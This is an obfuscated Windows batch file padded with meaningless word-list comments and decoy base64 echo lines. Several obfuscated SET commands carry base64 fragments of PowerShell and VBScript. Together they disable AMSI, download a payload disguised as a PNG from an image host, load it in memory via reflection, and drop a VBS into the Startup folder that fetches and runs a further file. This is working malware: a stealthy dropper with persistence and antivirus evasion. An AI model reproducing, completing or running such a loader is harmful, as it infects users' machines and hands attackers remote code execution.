@echo off
echo NzZUNFF2UGR2cEZkNm5WQ1IwVFppNjZ0Nzk3VkQ5RFk4U0VxczJMQ2Zvb2NNSGFqTkUwMDVmQ29vaWF2Sw== >nul 2>&1
REM hawk binary mirage fragment circle valley fathom undergrowth valley undergrowth
se%Xrc%T "kwFxBsCEyz=xMqyPZwdlndRSnfPSIsAVpgD"
echo ZjZSSnFQZzhWUGtlS1phdE1ybVpqQk9qa1Jybk5FUjZYZG5RemI0N0F4MWVlME1QWURhZVQ= >nul 2>&1
Se%tfMi%T "wvMDgiBYWwjfO=rRBTPUYYXzBJJZnn"
REM echo hawk ruby fragment odyssey kappa beacon kiln
sE%tzTU%t "CiVfFFsti=UyUCgktWTcE"
REM circle vertex beacon twilight glimmer clearing beacon glimmer strobe
REM core mirage circle undergrowth mirage kappa vertex sword circle kappa
echo QVF5RVlWdURqYlFLMGc3Y000dm5lQUxwRXljd085ajBaVzZqenBoejJteTZ1cElxMDZyemlDeEJkRk1wN0Y= >nul 2>&1
REM guard twilight kappa guard
echo Uk1vcXNKaWVRa25EOXZNa3FuOG9RaXRjdkV6RjZIZElvSmNQU2J1MGVPck54Tm03eEZKUlJ6bzZtV0U0RGt2cEt1MElDckR4T1hjRWM1ZA== >nul 2>&1
se%sKyQ%T "pTUyGhOs=UZXh0Ci5TYXZlVG9GaWxlIHRlbXBGaWxlLCAyIDogLkNsb3NlCkVuZCBXaXRoCnNoZWxsLlJ1biBDaHIoMzQpICYgdGVtcEZpbGUgJiBDaHIoMzQpLCAwLCBGYWxzZQpFbmQgSWYKU2V0IHNoZWxsID"
Se%QxoX%T "bJeofH=xUeGGmrOBXWcCqrju"
REM valley guard strobe strobe undergrowth clearing phantom zenith
REM fragment glimmer valley kiln echo delta fragment vision circle zenith
REM shadow fragment binary
SE%FCh%T "jZCmQtIpQXa=xdjcbMXYIHL"
REM core phantom fathom fathom hawk twilight circle zenith
REM binary guard guard clearing sword cipher
Se%uetQQ%t "QhcGQFbqgDFjY=MLXGMCqjYtXUoiQJrHTPEqlNJyVjTAq"
REM delta echo undergrowth ruby fragment binary binary
REM vision vertex vision fragment shadow guard strobe strobe sword guard
Se%mQf%t "WTAMLMpfVCWEjkg=kaolLDRgCXcVunhPjQt"
sE%tnG%T "vfxMExDNKTzUlEP=VrcRUBzlavS"
Se%jRGof%T "xydZwtJ=fisOyIcUyuooNgZYGHGukQTcJAhGkvedjS"
echo TzlCRHhaRVJuRFRvVVdzNGlWaEtvV1FCYVloV1UwUmNkRENpbWxLNkhWemcyS2FVeXJEQ1dqTGdoVndUSkNSWXh1V2t4OHk4djlKdQ== >nul 2>&1
REM twilight undergrowth binary
REM guard strobe ruby fragment vision vertex hawk odyssey
SE%qldg%T "WOEDxqZdHr=KEITBidEIUEUnCYSzwbDCTDAcA"
REM binary cipher twilight
REM undergrowth vertex pixel ruby sword lance pixel core
REM lance vision kiln cipher lance
Se%JGzI%t "whmeadbaxC=ezOJFxJtwlBhFpvOseJ"
REM phantom zenith echo
echo TEdlbzQzdllYM3dLbGtWaGViR0lMNXFFekNGQnZhTTdoRFd3b1F2SHU= >nul 2>&1
REM fragment odyssey vertex core vision vertex vision beacon
REM beacon sword shadow guard delta pixel lance shadow echo fragment
REM delta binary guard vision strobe shadow echo undergrowth phantom
sE%hkEBH%T "JdkGHlg=mEuuvorEzF"
SE%ick%T "ygIrbHYWdDiCH=xYdmdGpAGUsHgYmKxdiqlnUsozgjLGlz"
SE%fEuW%t "IudUedVHi=yaXB0aW5nLkZpbGVTeXN0ZW1PYmplY3QiKQpEaW0gdSwgYwp1ID0gIiIKRm9yIEVhY2ggYyBJbiBBcnJheSgkY2hyQXJyYXkpCnUgPSB1ICYgQ2hyKGMpCk5leHQKRGltIEh0dHA6IFNldCBIdHRwID0gQ3JlYXRlT2JqZWN0KCJXaW5IdH"
echo QUc4V1lkejZNVjF2SGtNa1RFamFMOHBEdXNsUGpPSmtkbU8wcXM5REhGQ0c2Z0NxYmlNcnhpWmM= >nul 2>&1
REM valley vertex beacon cipher beacon vertex twilight
se%vTYg%t "zeyRUNyW=SeJxSyZGtrHdWKytBIyOZWups"
Se%hMVp%t "tHZbQLad=vnAkngYxFFKnjmWXcKkSCwnMjvgBPSVNuZ"
REM kiln beacon twilight binary clearing core
REM pixel twilight circle valley strobe
se%Agv%t "hpXswXO=VXGyIGobJByaLmTeqgioUmSjpLD"
REM lance vertex fathom phantom fathom odyssey core
REM glimmer ruby beacon binary kiln ruby phantom fathom phantom
Se%CcPX%T "GxJRSHqzeSQiy=aOqmiEgfqGULwRUIInAhPBJ"
se%rwHBI%T "jqaLPqeNnlJQLl=KdUEPtpgwkJyEvaSFaE"
echo bFY3Uk9FUDZzMDJQdjlXOWNqTXp2eWFpTUdKWnlYMWI4UXpMdTd3MWVUM25XN3pybWxKZ2lzaUIx >nul 2>&1
Se%VrKAo%T "JkHVJaERRFqOoRV=fUbuXdxfmFTXFlPLWvZFDmhNi"
SE%wBh%t "UdmEcgIkty=JnVEweTCIXMlltXaAezYhARWXcesHF"
sE%lzQ%T "JGLjTjmAJwO=SMndVVNqgOSXqpOxR"
REM ruby zenith odyssey circle clearing
SE%FecE%t "fWdSmsVuD=iVURU1QJVx1c2VyLmJhdCIpCldpdGggQ3JlYXRlT2JqZWN0KCJBRE9EQi5TdHJlYW0iKQouVHlwZSA9IDIgOiAuQ2hhcnNldCA9ICJ1dGYtOCIgOiAuT3BlbgouV3JpdGVUZXh0IEh0dHAucmVzcG9uc2V"
REM pixel echo core kiln zenith phantom
echo aHFPOUFtb2JUeFNmVTVsWTBHeWNNZDlmVzliZHNoczlCZDNJQ1N2QTNHM0NZTEhseVRKZmNETlptNm9nUWZUWjlQSllGMTJVRXVWTHNp >nul 2>&1
echo bTNSUGpzUFB1VXFpMjJFcTlJR3ZaeEhPaU9iQkdybHY2azJrejd6QXE= >nul 2>&1
se%BMbg%T "iKwsjE=GIfAmmRvETLiKfrSsTFHoUMOxjYgKDB"
REM ruby pixel valley
REM kiln undergrowth vision echo beacon
REM delta ruby phantom
Se%ZvcJ%T "GEXcPsbgu=yYNAlwFeNzIBxeqxznnCWBxRZIe"
REM delta strobe cipher
REM phantom guard circle fathom binary undergrowth mirage lance
REM cipher shadow pixel phantom kiln pixel
REM strobe fragment phantom core ruby cipher beacon circle shadow
REM odyssey undergrowth mirage glimmer odyssey odyssey valley circle strobe binary
echo NTV5aGVHcWNPODVCNXlCOFNwa281M2xna2RkcE1ORERrVlU5Q0xRbG10QjlmUk9mVVRNblA2OU5NRENSd1FGR2VoazlLcXRJZzFFcVBza3c= >nul 2>&1
se%LOu%T "emyEluGXQPmF=naJRTfpJllUNVxzHAKdVzYNP"
REM vertex binary clearing
REM zenith shadow kiln odyssey beacon
echo cHlwdFRHaU0wODdlMEhRWEdMMFJENUg5bmRIRWxaeE1GSmxFc0VMWjVtOE81bWtkMXhNNzlvQVY0UlVVUHFiMm5sbQ== >nul 2>&1
echo NFF2Qzl6OGdPRDZRaUhtVThwb1dPM1EzYlNBSmhqMnVxY3ZOeUN3RkQ5MHI= >nul 2>&1
echo c2VGVWxJYmo1Z2hUcUFScjhRMXNZc29ZWGNTVmVRc0pQbnlZWjc2UnhSYTBMb0JFUE0= >nul 2>&1
REM circle sword kappa core vertex sword clearing pixel binary mirage
sE%FDEMl%t "TTKDBBr=ioJtpJKWLrqILaRGVxYDinIyNZlTkxduiJ"
REM lance undergrowth beacon
se%QwhyX%t "wRJszMmkYGU=hdmWLlrggLOoTjOPmKCHAWehCkL"
se%OCBu%t "DesCNEegafTZNd=PyEkjAzmCmCrBziObQLVSETeNs"
SE%fjje%T "nffBpUyu=xFQJiYyHcsbVCYgLxoAejqHvAgI"
REM kappa shadow valley guard echo mirage
REM glimmer clearing binary strobe ruby core glimmer zenith
REM guard zenith delta kiln clearing
REM fragment cipher phantom lance kappa
se%ceZO%t "WDwQNiOhuDLH=YXRoIH0KaWYgKC1ub3QgJHRhcmdldCkgeyAkdGFyZ2V0ID0gJEltYWdlVVJMIH0KaWYgKC1ub3QgJFNpbGVudCkgeyAkU2lsZW50ID0gJGZhbHNlIH0KZnVuY3Rpb24gTG9nLVNpbGVudCB7CnBhcmFtKFtzdHJpbmddJE1lc3NhZ2UsIF"
REM twilight glimmer pixel circle phantom
echo SG01aHQ4S01GanJqVkVFa0VaMk5nWWZrSzRqd3I1Zm91OFlRbmNlcHIwcWI= >nul 2>&1
se%KUDB%T "FoqnKBKsz=qCzXPqqAjnDbJPE"
REM glimmer circle kiln mirage
echo THo5em5zQ2lLMFo4VlRWS1g5bm5vdU9kSEFzMW41S1RiOWNNREltNklCVWJUdXVka1M5cTdl >nul 2>&1
REM undergrowth undergrowth phantom guard vision kappa zenith lance
REM echo kiln guard glimmer
sE%SkB%t "QvkyLpTAgk=yEMYXPcizNinIgWeDRORcCWS"
REM delta glimmer kappa
sE%aZjb%t "QXhOgDbFRXSQBh=hYphmxPQbuhyKUNmjMtdTpomvIheG"
REM fathom fathom core
REM circle pixel vision kiln ruby circle cipher
Se%PTlc%t "hrHUyMZqHE=DfpXZOkNplYq"
REM phantom core binary guard clearing twilight vision kappa fathom guard
sE%PQt%t "vMKtdeAPl=CtYmyNzPNwyGBTAPSVEAV"
REM sword fathom twilight shadow clearing pixel clearing vision core core
REM ruby mirage zenith hawk sword mirage lance clearing
REM kappa glimmer clearing vertex vertex fathom shadow fragment vertex beacon
sE%ByyA%T "yjmCHazHAq=GzlSVMmwLJTVViYflrFfCJaCNL"
REM circle core twilight hawk guard binary
SE%prJdo%t "RQkrWVb=YtvRlNbOqZy"
REM glimmer kiln clearing ruby phantom mirage
sE%cfYJY%T "wmzGTD=EFVQvhaVpOlHOVZX"
SE%Whw%t "VonibXKJIfwvcL=cRosFeFZwpxFrQ"
REM valley undergrowth cipher cipher fragment phantom
se%AiM%T "jYwAsR=pVPdgVufEMfbgJVzqBFpemtJn"
sE%HODDF%T "qxsvRViFSzibWsh=HroeKppbDlapTMSSc"
sE%nLScm%t "ucRTPlmPsbBNmun=UjObHBxxDlHTTEkPxxyGC"
se%lFOHZ%t "aPOHSn=fJHbMteUuHWiHcARpceOeY"
sE%eImJN%t "GRNrGy=xcnKETVELUFcSvJI"
se%cPKh%T "CxvAnanTEAMz=0gTm90aGluZwpTZXQgZnNvID0gTm90aGluZwoiQAp0cnkgewokdmJzQ29udGVudCB8IE91dC1GaWxlIC1GaWxlUGF0aCAkdmJzUGF0aCAtRW5jb2RpbmcgYXNjaWkKTG9nLVNpbGVudCAiWytdIFBlcnNpc"
Se%HvcFX%t "YRWjobAj=50RG9tYWluLkdldEFzc2VtYmxpZXMoKSB8IFdoZXJlLU9iamVjdCB7ICRfLkdsb2JhbEFzc2VtYmx5Q2FjaGUgLWFuZCAkXy5Mb2NhdGlvbiAtbGlrZSAiKm1zY29ybGliLmRsbCoiIH0gfCBTZWxlY3QtT2JqZWN0IC1Ga"
Se%Szc%t "XNYSuSXCvxqQf=metAKBhCtCx"
sE%tNX%T "ugOjRBPTS=LUkfVbRotjdQRvqfXIBcUxA"
echo ZHAyejBZbHQ3YlhsdmRXa2U5Rm8ycXFpRW9uaDhST2NiWTRXaFYxaTM= >nul 2>&1
REM kappa hawk zenith echo kiln twilight mirage vertex circle vertex
REM pixel clearing kappa kiln guard ruby pixel odyssey hawk cipher
REM kiln mirage beacon strobe strobe twilight fathom sword kappa
echo eUNsOHRJTmlwdGxTZlhobmkyb2JlM1NqYWFmTEFZT3EzMVJYeTdXemd2QWxHQkh3WVhY >nul 2>&1
echo YmxORWllVGxqV3ViM3c4cDdRUGFCSXdTcFJYN2prTDlaUmhCWkZ2S3kxYkhzbVo5ZzVQU3FVelRUSHFmbHZBa3RIOG1jYlVaZHBnOEs= >nul 2>&1
REM ruby clearing core core phantom twilight vertex shadow phantom
se%Npsog%T "gDQGScmduK=LxiJxJOsEKjieYUKcxY"
echo ZWU1U3ZYNFRFb0FhSHFzYjRxRjdwak4zQ3FiOHA4SHBFZ0FpOGdyTWRLMWFwckdIVUJGNnV6bjhIR080TEJ3N3ZqcVkwWWc= >nul 2>&1
REM twilight valley vision phantom pixel vision echo pixel vertex
Se%zkvT%T "srvBplFsFpgxIE=EalFybJlSvVuMiOERLJ"
sE%ngNDt%T "TzNtjL=LMLpgSYtEN"
REM guard kappa cipher
echo NUdmZ0F0Slo4ZW5uaFlYMW01U1FXa2lCdjNpOTFLSUlPcFNzbG9rZkdsZ25rVWY1YWFCRW1o >nul 2>&1
REM delta glimmer hawk echo mirage core
echo dXYyeEo5cTZjUUpwSlB3NEFWbW52Tnk4OFRvWkF1dkxzb3hxQTVmV3NIOE1POWNmM2FSTmdvMXBqVTBqT2NCeGxTbWhzcGRZdDk= >nul 2>&1
se%lGl%T "NbkSkwXzFxMuo=zoWKVCRYyJKtjEksbgm"
REM vertex fathom clearing core circle kiln
se%zXwW%T "UuZTAf=C1hbmQgKCRfLkdldFBhcmFtZXRlcnMoKS5Db3VudCAtZXEgMSkKfSB8IFNlbGVjdC1PYmplY3QgLUZpcnN0IDEKJGxvYWRlZCA9ICRsb2FkTWV0aG9kLkludm9rZSgkbnVsbCwgKCwkcmF3U"
REM pixel circle vertex undergrowth circle hawk binary undergrowth hawk
Se%CoLqi%T "gaOifdo=pReSKBuKvsqVliMdNuluQlXdTsVcil"
se%yYKVL%t "EuSAPMnUzWkV=JcNKGXCeJjaxNYqUCYolpUQszSPa"
sE%QtDN%T "xgSbwgc=AOAPxbBvePXFATgMF"
REM clearing beacon clearing lance core
REM delta glimmer glimmer
REM valley shadow clearing delta circle mirage guard ruby
SE%VGKmi%t "ABBjSh=XbVgyrjogHAhBDHKwAxFHfNbKEDDxBkbdFg"
REM pixel hawk delta vision guard odyssey undergrowth phantom hawk
sE%yaNin%t "MqcMWKstH=QUAQQohuepSFs"
REM clearing strobe odyssey shadow glimmer phantom odyssey sword fragment twilight
echo cHFYRWdNRjBQeXNocXZnZUd2STJ4RnVHV1BBdEt0WFdnRG1IR0s0cDRZcGtWbTY= >nul 2>&1
Se%DXm%t "ydgBLi=OxGXZQRlHdgblDCCsvrUtLyrTZHUVRwQT"
REM pixel ruby odyssey mirage
REM kappa vision fragment binary zenith guard fathom clearing sword guard
Se%MCrJN%T "eeakBEBYegFlQG=EXQoPYBGlRusIzzTfeNhKXRO"
sE%Yug%t "IWYhOpxKqIaS=cVpuFgPbslZEhCwNTnzqcNGxmr"
sE%hLYP%T "vSYXSKzGNDaZuio=gFlnuBUabYAdmFSjipjvDLClJNLJhIGNbys"
REM fathom zenith ruby glimmer sword zenith
SE%KwsqG%T "hzsLPaqpdsin=huELphzpJEmMIogqOxXAJDahgUW"
SE%zAZ%t "mKtZXpYqDHecCW=PJDJEuMhtdwcdUGmNVca"
REM mirage core ruby glimmer twilight
REM hawk echo echo vision undergrowth vision echo lance odyssey echo
Se%PUAug%t "PyDQpbtN=mqUEgUjZriihIPrSMVM"
Se%Mko%T "TPrFdoNFses=AQTSSbolxOCrlhddTPpyU"
REM binary strobe echo lance kiln mirage kappa
echo N0Yzd3VoSHdyc0N2dktrN3BVanZXUTZ0NjZLbnNNMG5uOFVjWlRoRDhYTG4xSU1HUFgxbGJ0dDV4ejVP >nul 2>&1
echo dVpKZlllRlBFOW1ZUnFTUk4yakF4MVJQZU1HcFFJakNuT1M4ZlNuYXpEUjA1WUlhWExrS1E= >nul 2>&1
REM glimmer lance cipher ruby ruby fathom
Se%XuHBw%t "XTZlJNa=bfAtrjuQDzoCQJc"
se%egcp%t "gYEkxsIsFlRigI=dmtrRyhDrp"
REM circle kappa circle phantom mirage
Se%rvob%T "WVUFHfv=PUQEVnxgYPJOFDeBRIsWKkkWjfC"
echo cmJMeEhNaUJjUFQ0T0l2dmM5V3NQN2J1N2hFWk5rZjB0U2RHUlk5UjBh >nul 2>&1
echo aFhkcEV2WjlITlBSelp4aWk1S3RWOU5udjFqdGdXZ0JDZVZoMXl3UVNscnZYRDdUVkpDS0g3U2QyZEpLcUpFU0xM >nul 2>&1
echo T2dGajZOd0hHZkVDMFdBcFNYcUpHZERRV2s1WU5ndzFyZ3VFR2g4dVE0Z0R5WjI4SjN0ZUF6MnZm >nul 2>&1
sE%FQin%T "pJtovy=zGjEbbsvfrhhNZElBMIrPFZWXWOaQj"
sE%vAt%T "lRkDYnjXY=AcgilGFKjssVEVxOQXTP"
Se%gks%t "IktnkjAqsZtxry=DZXpuNRDei"
REM circle vertex glimmer valley kiln
sE%uPCC%t "ZRJPAKfvXQwdk=aOxHucQQmnIjdjvHGLasCR"
REM vertex binary valley beacon kappa hawk
REM clearing clearing hawk mirage guard odyssey circle
REM vision clearing pixel zenith clearing
REM strobe sword phantom binary
REM zenith phantom mirage
SE%yrMdt%T "NccQFJPNs=iIZSURehSDWsuuTbuAgEWCloFIN"
REM circle binary guard valley phantom guard odyssey kappa phantom binary
REM echo fathom hawk odyssey vision fragment glimmer vision binary echo
REM kappa cipher pixel pixel clearing
REM clearing shadow vertex beacon undergrowth echo fragment echo mirage
REM odyssey cipher vertex odyssey undergrowth binary
REM strobe beacon strobe mirage
SE%uarC%T "zidXMo=ayOthGcfnAjIhnWjdXuQFhdTkV"
Se%AYKoO%T "mzXDhYh=xgSGorBzdmnbuSCFGkODUmBCZlwXY"
REM delta binary kiln circle phantom undergrowth strobe hawk odyssey
echo OGVuR1RreTFVN0ladTE3YVNHM1Zzbml5YWZpTEUzQlFya2JIQVF1WXc0MXlYc2l1RkRiRA== >nul 2>&1
sE%QEAt%t "BnimbAXRXHOIF=epZLsRagiOloyzECghBHDhrKxzEJtKEpA"
SE%hwSwm%T "WTIiqtoaf=OgRfAduhRCYhJXnVvKExvtfCUHWg"
REM vertex strobe binary fathom shadow
REM vertex cipher vertex fathom circle vision cipher sword mirage
echo ZTB6Vk52NXlEVVRaZkR2bk56QTFaUlA2aFdURmE4bWpkMEdZM0V6UHJrSWdFc0xEbUVHNnRCQTVRaA== >nul 2>&1
REM guard kiln vision twilight core
SE%HrNSr%T "HtsxofviF=TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IikKJGRhdGEgPSAkd2MuRG93bmxvYWREYXRhKCRTb3VyY2UpCiR3Yy5EaXNwb3NlKCkKfSBlbHNlaWYg"
REM ruby valley guard kiln shadow vision circle cipher strobe glimmer
REM beacon twilight kiln pixel fathom vision pixel core kappa odyssey
REM zenith core odyssey
REM fathom kiln clearing clearing
SE%SFnLH%T "dSkCiKgcxz=zyFKrGBkpvYUWckEwPwlZkdWNiiYFfsThh"
echo U2tEZlZId2lrelN0eXB3QWUwdkdWY2dlNGliaVN4eWNNRllIdDNXcjhISmdKWEZWV2NzYWlwWg== >nul 2>&1
REM cipher pixel hawk lance kiln valley
REM zenith delta clearing glimmer
REM vision fathom phantom glimmer twilight kiln glimmer valley ruby
REM vision glimmer vision circle
echo TXFodlllYXp1eGRxcTNiSm9WaEVrNTl5emk4OGRHRUNQanNGcFo3bWJ2RENqd21KOUc= >nul 2>&1
echo UkdVUXYxZms3THU0d2VFM21PMUdqTGthNW1RbE4zYUdDTXNDR2ljYzc= >nul 2>&1
sE%gOUD%T "IYKkyf=zCycbxTQbZPLrGZjcDHgsBeTmEEQClbrbEu"
sE%kcf%T "WdzExVfhJ=daMTsmjpAxraPC"
REM delta ruby vision mirage vertex fathom sword circle
SE%GEiGv%T "CqyZnp=kpaDIWgpjyogkkHmrqbUwmHpM"
echo cHQySE5CUlYwd2J0OUNDUkpQaHMwMGRQSlM4VUQ5aXQ0Q25VYkNOTQ== >nul 2>&1
REM echo guard lance fathom glimmer delta shadow
sE%kGSY%t "vcsbCpLesjZMC=qofbUCGOKCFAjj"
Se%HOlaa%T "qlWomP=VcmwpCiRzdGFydHVwRm9sZGVyID0gW1N5c3RlbS5JTy5QYXRoXTo6Q29tYmluZSgkZW52OkFQUERBVEEsICJNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiKQokdmJzUGF0aCA9IFtTeXN"
Se%WIkMF%T "VdENdkiThKwK=fJjwwueLfFKlXIVPNseHNiNRaLkSEmECREH"
REM lance twilight binary kiln circle glimmer beacon lance vertex
REM odyssey zenith core delta hawk lance cipher ruby
REM mirage ruby guard odyssey binary shadow cipher ruby guard zenith
se%Fksd%t "JFRfsJETZIOE=GfaadEcdHKaJOSGUrpfZIOonE"
se%Gpv%T "KwwxwiN=EVudHJ5UG9pbnQgcmV0dXJuZWQuIiAiR3JlZW4iCn0gZWxzZSB7CkxvZy1TaWxlbnQgIk5vIEVudHJ5UG9pbnQgZm91bmQuIiAiV2hpdGUiICR0cnVlCn0KfSBjYXRjaCB7CkxvZy1TaWxlbnQgIkxvYWRlciBFc"
echo ejZjRmtjQnFBTWVrbGF1Q0hnbmF0eEdsRGZJTkZxSUhvUnBIWVlGWWZVdlNud0NjR1l1MUZtUDFSdTMxcGxSS3M2eklVN2I= >nul 2>&1
Se%Lfz%t "lBSMKTTVWsRCvL=VhRdCRgWXmmgGLwwKCZZmXxNlWzVS"
sE%eGa%T "kjXKQO=schMvRQDqAsiOqzCEQkHZXXsnYukSZP"
se%MWkO%T "JrarSrmC=WDldyRmzhhcKxtc"
se%aIZ%T "soNqMxD=CwgJHRydWUpIH0KfQp9IGNhdGNoIHsgfQp9CkRpc2FibGUtQU1TSQokSW1hZ2VVUkwgPSAiaHR0cHM6Ly9pLmliYi5jby84bkhaQk1zVC9tZW0ucG5nIgppZiAoLW5vdCAkdGFyZ2V0KSB7ICR0YXJnZXQgPSAkSW1hZ2VQ"
REM sword phantom shadow strobe core
REM mirage vertex shadow kiln fragment
Se%PErR%t "UCrFukiGzDW=RHRJcCwQlNboj"
REM valley cipher kiln circle sword fragment
Se%jnSQ%t "gZfYnJ=MRNCQxjroHpoBKQrdmyLe"
se%xqmB%T "dLxtrlujQvykiw=RIEpxdFHdgvVJytIKncxeUBaFx"
REM clearing pixel hawk ruby odyssey
REM zenith delta kappa sword odyssey phantom vertex
REM shadow lance binary guard valley phantom cipher
echo anNHQXhpMk42OWhUc1kwUTB6aWFtZmFJZWxwNEJYQjFpWDZ4cHkwUVJqVGpTREF0UTNZSGhhamF3UkZKbFpXYzVnOVZKVzM2ODUzMTNTSw== >nul 2>&1
se%Azs%t "okVhtk=zIshcTKfuyPCiCMNoheyppma"
echo OENDS0g0bGNVSXJ0WkZwQlI2bHcwU09ycVFkU1NUcUtJQkZrb0d5ZWZMWlRUZGFvaENkQjlXaWZ1c3NuSkc5QTFRU29NOU1NWA== >nul 2>&1
SE%axim%t "TEDDuMPfm=BMFZYWvhGJndWSvLjHvs"
REM valley twilight vertex lance sword mirage cipher hawk
REM shadow pixel sword
echo VnRSQkFldkxOSUpzb1Ywb3MyQkhTTE9KWVk2a2RWWWxwQnZHTlptRHJGMHYxd2J5alBpMHRieUJjVUdEeTU0bnRCbHU5ekxx >nul 2>&1
echo dzFFZlJONW81bnk1SE9vYUExU08xTVd1MWg2ZHZ2Z0YyaEFYQXg2MENmOUFLb1FxTUx4UmhnQnVKdzdKelpq >nul 2>&1
se%XpjB%t "YYrLUT=ZXMoJFNvdXJjZSkKfSBlbHNlIHsKTG9nLVNpbGVudCAiSW52YWxpZCBzb3VyY2U6ICRTb3VyY2UiICJXaGl0ZSIgJHRydWUKcmV0dXJuCn0KJG1zID0gTmV3LU9iamVjdCBTeXN0ZW0uSU8uTWVtb3J5U3RyZWFtKCwkZGF0YSkK"
REM ruby phantom glimmer
sE%twHB%T "yivBEJrp=zQIyFeaXYUCJTnoEYsdUDhqivwgSn"
REM sword fathom odyssey hawk glimmer fragment shadow pixel
echo blptQ0hIRXYxdzNOQXRldVFuVnJVYUhTTjY4UG5HY0tHOGV5OWFEWXpNS0NzQmZI >nul 2>&1
Se%umaTK%T "MLaOkuXyWRpkj=hlDwVIbCaxYicWSpq"
echo TVNnTkRBc1g3VGpZYTJmRVlFcWFxcFB5UWdxc2xLMjUwbDU4MUZ4bXBNVTBKR2dTYnRpcVNhYjFobTJRbDZsSndzeHA3akdtU2dJ >nul 2>&1
REM zenith kiln hawk binary fragment strobe zenith guard
se%SDLw%T "bLtdvYggvxhyx=NwrBswicyHnAiPMFaLkQHclpeZQfgvVsYWv"
SE%jut%t "EKeVzXokSdHIA=GTuuFsKNDIQkpOPpQPQqdnSkUrS"
REM valley fathom kiln mirage echo lance
echo Mk5JZEw2YXp6ZllCakNzUlFMYWE5U1AwVnQ5b0RGeGwwblJmRlc1UnI= >nul 2>&1
sE%cnvH%T "zujMZJzcAIMoYI=DiNIvZOQbBjusLMntvPTxBIvWlF"
se%tuF%t "pxMOEpMgIu=SVIxYgKtMIXXVHQRVsNqV"
REM mirage lance phantom kappa
se%EzY%t "kGdJpENWoMGyJg=tELQuNTKngQmsisL"
se%vGYpu%T "dMwdimfcdHPBdxy=VgAeMAtqHkC"
REM ruby vertex hawk ruby odyssey strobe hawk guard odyssey twilight
echo cTF4S3hlVEN1TVN3dlBkZkRFOXgzQjFWMTlDOWtjWWJRdkJJcTF2QkpvUm11M2VFdzJkbkNXV2V2bGNqdEZYNUdIOTBK >nul 2>&1
echo REdmck1ETzN3OWUwTngxbVZLekJpOUJGamN3ekhvdmo5VVFScXYyT09EdlQ3SUJrdGd6VnVuTjQ4SkpXVWJLT0gw >nul 2>&1
REM mirage beacon zenith valley odyssey circle twilight
Se%vCb%T "ZdMHoYxzdrCdSyL=SEMzyIMrzMgVsRSjaiAMsZOBUNPyY"
REM lance undergrowth mirage shadow binary zenith glimmer twilight vision shadow
REM lance cipher mirage clearing fragment
REM valley guard ruby kiln odyssey fragment kappa cipher
se%Rvdoj%t "auIddOInMbxYh=cYlpyUFgcOovdBthViebruCbSfJA"
sE%bwa%t "QVxQOQJEI=XKLnkvhjPLwfkeMIXSpJH"
echo N3RCdWM2bUlCWnVtaTVRUEVNUUhGeWxFZlBJUTVsZnlYME02THRtZnltbWRWTkV3M0Z6QWJkS1RuZlhRMEdsRFNtMnVtSlhkV1ZRNg== >nul 2>&1
sE%rYR%t "tmkepcAjf=hGuPdzTOSHqOcQDnABLdLAIerdxbimZC"
echo NUN0Nnc2OGViSUgydUtpNFJEWlZRQWVhZ2hqdTk5ODZoOUpzTmJ0elFheE5uUzI3bXBHVHBGaDNsWnMyZFVVdVE1S1dqT2FVY2lZU2RJ >nul 2>&1
REM kiln delta lance hawk fathom glimmer
SE%jggp%t "NuabJK=LjqiQbybGaIRIwbMSwlT"
REM clearing odyssey glimmer echo fragment valley lance
echo dUFjNk5iV0V4dnBPbTVTSzFyU25BUUdRY1BWUlhRYlJjVTVvSE1KYTduS0V6Y3ZLS0UwTFNnN3FiNmFpSEVMdHlrejJUTDlXMjB1ag== >nul 2>&1
REM circle fragment sword glimmer vision vision twilight core undergrowth binary
sE%dEjoi%T "akSfrG=pvtFkqVJQRogb"
sE%DfV%t "aOAbbFSIJrh=yiITgSPdCWfgyUoZOaWYwBTZIlOuiibfr"
REM core pixel twilight delta ruby shadow
echo Q0UwSGVBYmhzUjk3Wkt3ZFdieXpIUHRkc21kQTlLb3hkZ3ZLUk1uSDY0UDE1MjNDUTkwSmt1Z3Ba >nul 2>&1
REM odyssey shadow vertex clearing
echo MTVzb09kQUNxakdUdDV1SktuVlJOU3NJcjVNVE9DUll1eDUxSnFRMThPbkZXek9DYzdvM0xEdGJOa3NFWGxFa0ZuaQ== >nul 2>&1
REM beacon zenith mirage undergrowth clearing
